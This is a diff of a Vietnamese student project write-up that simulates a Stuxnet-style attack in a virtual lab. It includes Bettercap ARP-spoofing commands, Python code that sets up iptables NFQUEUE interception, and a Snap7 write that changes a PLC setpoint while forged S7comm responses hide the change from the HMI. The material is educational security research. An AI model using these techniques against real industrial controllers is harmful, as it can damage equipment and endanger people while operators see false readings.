@@ -6,12 +6,11 @@ Dưới thời tổng thống George W. Bush, sau nhiều nỗ lực ngoại gia
 ![alt text](image-12.png)
 
 Quá trình tấn công:
- as as  a a
 
-1. **Lây nhiễm trong windows**: Được lây nhiễm vào một máy tính trong mạng nội bộ thông qua USB do một gián điệp để lại. Sau đó, nó lan tiếp trong mạng nội bộ thông qua 4 lỗ hổng Zero-day  của Windows và gửi thông tin về các máy chủ Command and Control (C&C) của kẻ tấn công [[1]](../Research%20papers/Stuxnet%20in%20details.pptx.pdf)
+1. **Lây nhiễm trong windows**: Được lây nhiễm vào một máy tính trong mạng nội bộ thông qua USB do một gián điệp để lại. Sau đó, nó lan tiếp trong mạng nội bộ thông qua 4 lỗ hổng Zero-day  của Windows và gửi thông tin về các máy chủ Command and Control (C&C) của kẻ tấn công [[1]](../Research%20papers/Stuxnet%20in%20details.pptx.pdf).
 
 
-2. **Lây nhiễm vào phần mềm Siemens Step 7**: Tại mỗi máy tính windows, nó quét để truy tìm phần mềm **Siemens Step 7**. Nó can thiệp vào thư viện giao tiếp `s7otbxdx.dll` của Step7 để chặn và sửa luồng trao đổi giữa phần mềm Step 7 và PLC:
+2. **Lây nhiễm vào phần mềm (*)Siemens Step 7**: Tại mỗi máy tính windows, nó quét để truy tìm phần mềm **Siemens Step 7**. Nó can thiệp vào thư viện giao tiếp `s7otbxdx.dll` của Step7 để chặn và sửa luồng trao đổi giữa phần mềm Step 7 và PLC:
 
 
     <div style="display: flex; gap: 20px; align-items: flex-start;">
@@ -49,7 +48,7 @@ Sự tồn tại của Stuxnet chỉ được phát hiện rộng rãi vào năm
 > [!NOTE]
 > Trong mô phỏng tấn công của đồ án này, để phù hợp với giới hạn về thời gian và nguồn lực, chúng tôi sẽ mô phỏng đơn giản hóa kịch bản tấn công man-in-the-middle ở trên tầng giao thức mạng thay vì tại dll như thực tế Stuxnet đã làm.
 
-*Tia Portal là một bộ phần mềm độc quyền của Siemens để làm việc với các dòng PLC của hãng (S7-300, S7-400, S7-1200, S7-1500), bao gồm: STEP 7 dùng để lập trình và cấu hình cho các dòng PLC, WinCC dùng để thiết kế HMI/SCADA, S7- PLCSIM / S7 PLCSIM Advanced dùng để mô phỏng hoạt động của PLC trên máy tính mà không cần phần cứng thực tế, Startdrive dùng để cấu hình biến tần, động cơ.*
+**(*)** *Tia Portal là một bộ phần mềm độc quyền của Siemens để làm việc với các dòng PLC của hãng (S7-300, S7-400, S7-1200, S7-1500), bao gồm: STEP 7 dùng để lập trình và cấu hình cho các dòng PLC, WinCC dùng để thiết kế HMI/SCADA, S7- PLCSIM / S7 PLCSIM Advanced dùng để mô phỏng hoạt động của PLC trên máy tính mà không cần phần cứng thực tế, Startdrive dùng để cấu hình biến tần, động cơ.*
 
 # Mô phỏng tấn công
 
@@ -57,38 +56,52 @@ Sự tồn tại của Stuxnet chỉ được phát hiện rộng rãi vào năm
 
 > Mục tiêu của tấn công là làm thay đổi giá trị của một biến nằm trong datablock của PLC, từ đó làm thay đổi hành vi của hệ thống điều khiển. Đồng thời can thiệp vào quá trình gửi dữ liệu để HMI không nhận ra sự thay đổi này.
 
-## PLC
+## Thiết lập PLC
 
 Import dự án vào OpenPLC Editor với thư mục [này](./plc_server_code/). Chương trình đang chạy trên PLC có dạng như sau
 
 - Với cấu hình datablock như sau để làm biến đầu vào và ra cho PLC:
 
-    ![alt text](image-1.png)
+    <div align="center">
+        <img src="./image-1.png">
+        <i>Khai báo 2 datablock do mỗi datablock trong OpenPLC chỉ cho phép 1 kiểu dữ liệu</i>
+    </div>
 
-- Khai báo tag và chương trình logic (viết dưới dạng Structured Text):
+- Khai báo tag và chương trình logic (viết dưới dạng Structured Text). Chương trình mô phỏng lại tốc độ quay của động cơ dao động quanh mốc `iSetpoint` được chỉ định bằng `1200`:
 
-    ![alt text](image-2.png)
+    <div align="center">
+        <img src="./image-2.png">
+        <i>Khai báo tag và chương trình logic (viết dưới dạng Structured Text)</i>
+    </div>
 
-    Gồm các tags:
+    Gồm các tags (Giống dạng binding variables trong IT):
 
-    - `iSimSpeed`: tốc độ thực tế máy đang quay
-    - `iSetpoint`: tốc độ ngưỡng để máy quay dao động quanh giá trị này.
-    - `iCounter`: Dùng để tạo dao động mô phỏng
-    - `bCentrifugeStatus`: trạng thái hoạt động của máy ly tâm với 0 là bình thường, 1 là quá tốc độ.
-
-    Chương trình mô phỏng lại tốc độ quay của động cơ dao động quanh mốc `iSetpoint` được chỉ định bằng `1200`.
+    - `iSimSpeed`: tốc độ thực tế máy đang quay, nằm ở `DB1`, lấy 2 Byte từ offset 0
+    - `iSetpoint`: tốc độ ngưỡng để máy quay dao động quanh giá trị này, nằm ở `DB1`, lấy 2 Byte từ offset 2
+    - `iCounter`: Dùng để tạo dao động mô phỏng. 
+    - `bCentrifugeStatus`: trạng thái hoạt động của máy ly tâm với 0 là bình thường, 1 là quá tốc độ, nằm ở `DB2`, lấy 1 Byte từ offset 0. Ở đây mô phỏng khi tốc độ quay vượt quá 1500 Hz thì máy ly tâm bị hư hại.
 
 
-## HMI
+
+## Thiết lập HMI
 
 Import dự án vào FUXA với thư mục [này](./hmi/fuxa_hmi_design.json):
 
+<div align="center">
+    <img src="./image-8.png">
+    <i>Khai báo các HMI tags tương ứng với các PLC tags cần giám sát</i>
+</div>
 
-![alt text](image-8.png)
+<div align="center">
+    <img src="./HMI.gif">
+    <i>Giao diện HMI, hiện tại máy đang hoạt động quanh mức 1200 nên sẽ hiển thị màu xanh</i>
+</div>
 
-![alt text](image-3.png)
+Trong Debugger của OpenPLC Editor:
 
-Thu thập gói tin trên máy HMI thấy là sự lặp đi lặp lại của 2 cặp request-response sau:
+![alt text](image-17.png)
+
+Thu thập gói tin trên máy HMI thấy giao tiếp giữa HMI và PLC là sự lặp đi lặp lại của 2 cặp request-response sau:
 
 - Cặp đầu tiên là request yêu cầu đọc 4 byte tại DB1 tại bit 0 của byte 0, tức ứng với biến `iSimSpeed` và `iSetpoint`:
 
@@ -114,7 +127,7 @@ Biến `iSimSpeed` là `042d`, biến `iSetpoint` là `04b0`. S7 dùng Little En
 
 Từ máy tấn công sẽ làm đồng thời:
 
-- Tạo một lệnh ghi để ghi vào giá trị của một biến nằm trong Datablock của PLC sử dụng thư viện Snap 7 hoặc S7 Comm của Python. Ở đây sẽ chỉnh sửa giá trị biến `Setpoint` nằm ở vị trí `DB1.DBW2` từ `1200` thành `2000`. Script tại [đây](./attacker/test_readwrite_db_via_snap7.py) hoặc [đây](./attacker/test_readwrite_db_via_pythonS7comm.py). Output:
+1. Tạo một lệnh ghi để ghi vào giá trị của một biến nằm trong Datablock của PLC sử dụng thư viện Snap 7 hoặc S7 Comm của Python. Ở đây sẽ chỉnh sửa giá trị biến `Setpoint` nằm ở vị trí `DB1.DBW2` từ `1200` thành `2000`. Script tại [đây](./attacker/test_readwrite_db_via_snap7.py) hoặc [đây](./attacker/test_readwrite_db_via_pythonS7comm.py). Output:
 
     ```
     Current Speed  | Setpoint Speed    | Centrifuge Status
@@ -125,58 +138,196 @@ Từ máy tấn công sẽ làm đồng thời:
 
     `iSetpoint` từ `1200` (0x04b0) thành `2000` (0x07d0) và khi này trạng thái `bCentrifugeStatus` từ `0` thành `1`.  Nếu như chưa chạy scritpt can thiệp thì trên HMI sẽ thấy máy đang dao động quanh mức 2000:
 
-    ![alt text](image-14.png)
+    <div align="center">
+        <img src="./image-14.png">
+        <i>Máy đang dao động quanh mức 2000, hiển thị màu đỏ do quá mốc 1500 Hz </i>
+    </div>
+  
 
-    ![alt text](image-15.png)
+    <div align="center">
+        <img src="./image-15.png">
+        <i>Kiểm tra trong các gói tin PLC gửi tới HMI để thấy giá trị của biến `iSetpoint` đã được thay đổi</i>
+    </div>
+
+    Tấn công thay đổi giá trị của PLC thành công, giờ ta sẽ can thiệp vào giao tiếp giữa HMI và PLC để HMI không nhận ra sự thay đổi này.
 
     
 
-- Tấn công Man in the middle bằng kỹ thuật ARP Spoofing giữa cổng của Router (`.60.1`) và HMI (`.60.10`) thông qua tool **Bettercap**:
+2. Tấn công Man in the middle bằng kỹ thuật ARP Spoofing giữa cổng của Router (`.60.1`) và HMI (`.60.10`) thông qua tool **Bettercap**:
 
 
     ```bash
     # Run on attacker machine
     sudo bettercap -iface ens33 
 
+    # Scan network for devices
+    net.probe on
+
+    # Show network devices
+    net.show
+    ```
+
+    Đảm bảo đã Bettercap đã thu được thông tin của tất cả các thiết bị trong mạng:
+
+    ```
+    ┌───────────────┬───────────────────┬─────────┬──────────────┬───────┬────────┬──────────┐
+    │     IP ▴      │        MAC        │  Name   │    Vendor    │ Sent  │ Recvd  │   Seen   │
+    ├───────────────┼───────────────────┼─────────┼──────────────┼───────┼────────┼──────────┤
+    │ 192.168.60.20 │ 00:0c:29:a6:c0:b0 │ ens33   │ VMware, Inc. │ 0 B   │ 0 B    │ 14:52:24 │
+    │ 192.168.60.1  │ 00:0c:29:f1:b8:5e │ gateway │ VMware, Inc. │ 816 B │ 0 B    │ 14:52:24 │
+    │               │                   │         │              │       │        │          │
+    │ 192.168.60.10 │ 00:0c:29:2f:0d:bb │         │ VMware, Inc. │ 16 kB │ 8.3 kB │ 14:53:43 │
+    └───────────────┴───────────────────┴─────────┴──────────────┴───────┴────────┴──────────┘
+    ```
+
+    ```bash
     # Specify IP of Router gateway and HMI as targets
     set arp.spoof.targets 192.168.60.1, 192.168.60.10
+    
+    # Enable internal ARP spoofing
+    set arp.spoof.internal true
+    # Enable full duplex ARP spoofing since we need to ensure HMI -> PLC direction is still working
     set arp.spoof.fullduplex true
+    
+    # Start ARP spoofing
     arp.spoof on
     ```
-    # Tắt đi bật lại để làm mới đợt tấn công
-arp.spoof off
-
-# Bật các tùy chọn ép buộc lừa đảo
-set arp.spoof.internal true
-set arp.spoof.fullduplex true
-
-# Chạy lại
-arp.spoof on
-
-Check net.show truoc da
-
 
     Khi này trên HMI bắt gói tin sẽ thấy xen kẽ các gói tin của S7 và các gói ARP Spoofing:
 
-    ![alt text](image-13.png)
+    <div align="center">
+        <img src="./image-13.png">
+        <i>Gói tin S7comm và ARP Spoofing xen kẽ nhau</i>
+    </div>
 
-- Chỉnh sửa gói tin S7comm để thay đổi giá trị `Setpoint` từ `2000` thành `1200`. Sau khi Bettercap đã redirect được gói tin giữa Router gateway và Router, đẩy các gói tin này vào NFQUEUE của OS (Vì ta muốn xử lý các gói tin thay vì để OS tự động chuyển tiếp) và sử dụng một script Python để lấy gói tin từ NFQUEUE (thông qua thư viện `NetfilterQueue`), parse gói tin S7comm, tìm đến vị trí chứa giá trị `Setpoint` ở `DB1.DBW2` và sửa giá trị này từ `2000` thành `1200` trước khi đẩy gói tin trở lại NFQUEUE để tiếp tục được chuyển đi. Script tại [đây](./attacker/mitm/s7_intercept.py).
+3. Chỉnh sửa gói tin S7comm để thay đổi giá trị `Setpoint` từ `2000` thành `1200`. Sau khi Bettercap đã redirect được gói tin giữa Router gateway và Router, đẩy các gói tin này vào NFQUEUE của OS (Vì ta muốn xử lý các gói tin thay vì để OS tự động chuyển tiếp) và sử dụng một script Python để lấy gói tin từ NFQUEUE (thông qua thư viện `NetfilterQueue`), parse gói tin S7comm, tìm đến vị trí chứa giá trị `Setpoint` ở `DB1.DBW2` và sửa giá trị này từ `2000` thành `1200` trước khi đẩy gói tin trở lại NFQUEUE để tiếp tục được chuyển đi. Script tại [đây](./attacker/mitm/s7_intercept.py).
 
+<div align="center">
+    <img src="./image-18.png">
+    <i>Tấn công thành công khi thực tế máy đang chạy ở mức > 1500 Hz (màu đỏ), nhưng Setpoint vẫn hiển thị ở mức 1200</i>
+</div>
 
+<div align="center">
+    <img src="./image-3.png">
+    <i>Kiểm tra debugger của OpenPLC Editor cũng cho thấy thực tế máy đang chạy giao động quanh mốc 2000</i>
+</div>
 
+## Phân tích tấn công
 
+Phần khó nhất của cuộc tấn công này là nào sao sửa đổi gói tin rồi chuyển tiếp lại được. Để đảm bảo tốc độ, ở đây sử dụng phương pháp ARP Spoofing bằng Bettercap để redirect gói tin đến máy Attacker, tại đây, gói tin sẽ được đẩy vào NFQUEUE để Python app gọi lên xử lý thay vì để OS Kernel tự động forwảd gói tin đi. 
 
+*Một phần vì Bettercap chỉ cung cấp khả năng chỉnh sửa gói tin khi intercept bằng Javascript mà ngôn ngữ này lại không phù hợp để viết bộ S7 Parser nên mới phải làm cách này*
 
+```Python
+# 1. Bật IP Forwarding
+    subprocess.run("sysctl -w net.ipv4.ip_forward=1 > /dev/null", shell=True)
 
+# 2. Tắt RP Filter (Tránh rớt gói tin chiều về từ Router)
+# Tránh kernel tự động drop gói tin lạ -> Cho phép gói tin từ PLC về được phép qua
+subprocess.run("sysctl -w net.ipv4.conf.all.rp_filter=0 > /dev/null", shell=True)
+subprocess.run("sysctl -w net.ipv4.conf.default.rp_filter=0 > /dev/null", shell=True)
+subprocess.run(f"sysctl -w net.ipv4.conf.{INTERFACE}.rp_filter=0 > /dev/null", shell=True)
 
-Với việc Parse gói tin S7, có một bộ Praser bằng C: https://github.com/ricardojoserf/s7-parser. Tuy nhiên nó có một vấn đề là không thể parse được phần `Data` trong gói tin S7, nên tôi đã dựa vào đó để viết lại bộ parser bằng Python và bổ sung thêm phần parse `Data` 
+# 3. Thêm Route tới dải PLC thông qua Gateway thật
+# Không có dòng này sẽ gây lỗi mất kết nối ngay lập tức trên HMI khi nó gửi yêu
+# cầu read var tới PLC
+print(f"[*] Thêm tuyến đường tới {PLC_NET} qua {GATEWAY}...")
+subprocess.run(f"route add -net {PLC_NET} gw {GATEWAY} 2>/dev/null", shell=True)
+
+# 4. Cấu hình Iptables
+print("[*] Đang thiết lập Iptables NFQUEUE...")
+subprocess.run("iptables -F", shell=True)               # Xóa sạch filter table
+subprocess.run("iptables -t mangle -F", shell=True)      # Xóa sạch mangle table
+subprocess.run("iptables -P FORWARD ACCEPT", shell=True) # Đảm bảo forward không bị chặn
+
+# Bẫy traffic S7 (Port 102) vào Queue
+# Để thay vì Kernel tự động drop gói tin, python app sẽ xử lý gói tin và chuyển tiếp lại
+subprocess.run(f"iptables -t mangle -A FORWARD -p tcp --dport 102 -j NFQUEUE --queue-num {QUEUE_NUM}", shell=True)
+subprocess.run(f"iptables -t mangle -A FORWARD -p tcp --sport 102 -j NFQUEUE --queue-num {QUEUE_NUM}", shell=True)
+
+# Chặn gói RST tự phát từ Kernel (Tránh Disconnected)
+# Kernel sẽ tự gửi RST (reset connection) nếu nhận gói từ port nó không biết
+subprocess.run("iptables -I OUTPUT -p tcp --tcp-flags RST RST -j DROP", shell=True)
+```
+
+Sau khi đã có được gói tin cần tiến hành chỉnh sửa. Tuy nhiên đã thử tìm trên mạng nhưng không có bộ Paser nào cho S7, chỉ duy nhất có một bộ Praser bằng C tại  https://github.com/ricardojoserf/s7-parser. Tuy nhiên nó có một vấn đề là không thể parse được phần `Data` trong gói tin S7, nên tôi đã dựa vào đó để viết lại bộ parser bằng Python và bổ sung thêm phần parse `Data` 
 
 Thử nhiệm bộ parser bằng cách chạy trên một file PCAP, chỉ định gói tin cần extract (ở đây là gói tin thứ 9):
 ```bash
 uv run .\s7_parser.py .\wincc_s300_setup-alarm-read-write.pcapng 9
 ```
 
- 
+Output:
+
+```
+Analyzing S7 packet #9:
+
+================================================================================
+S7 Protocol Packet Detected
+================================================================================
+
+S7 Communication
+  Header: (Ack_Data)
+    Protocol Id: 0x32
+    ROSCTR: Ack_Data (3)
+    Redundancy Identification (Reserved): 0x0000
+    Protocol Data Unit Reference: 2
+    Parameter length: 2
+    Data length: 52
+    Error class: No error (0x00)
+    Error code: 0x00
+  Parameter: (Read Var)
+    Function: Read Var (0x04)
+    Item count: 8
+  Data
+    Item [1]: (Success)
+      Return code: Success (0xff)
+      Transport size: BIT (0x03)
+      Length: 1
+      Data: 01
+    Item [2]: (Success)
+      Return code: Success (0xff)
+      Transport size: REAL (0x07)
+      Length: 4
+      Data: aabbccdd
+    Item [3]: (Success)
+      Return code: Success (0xff)
+      Transport size: BYTE/WORD/DWORD (0x04)
+      Length: 4
+      Data: feadbeef
+    Item [4]: (Success)
+      Return code: Success (0xff)
+      Transport size: BYTE/WORD/DWORD (0x04)
+      Length: 2
+      Data: babe
+    Item [5]: (Success)
+      Return code: Success (0xff)
+      Transport size: BIT (0x03)
+      Length: 1
+      Data: 01
+    Item [6]: (Success)
+      Return code: Success (0xff)
+      Transport size: BIT (0x03)
+      Length: 1
+      Data: 01
+    Item [7]: (Success)
+      Return code: Success (0xff)
+      Transport size: OCTET STRING (0x09)
+      Length: 2
+      Data: 2504
+    Item [8]: (Success)
+      Return code: Success (0xff)
+      Transport size: OCTET STRING (0x09)
+      Length: 2
+      Data: 0011
+
+================================================================================
+
+```
+
+Giống với cách gói tin được Parse trong Wireshark:
+
+![alt text](image-16.png)
 
 
 
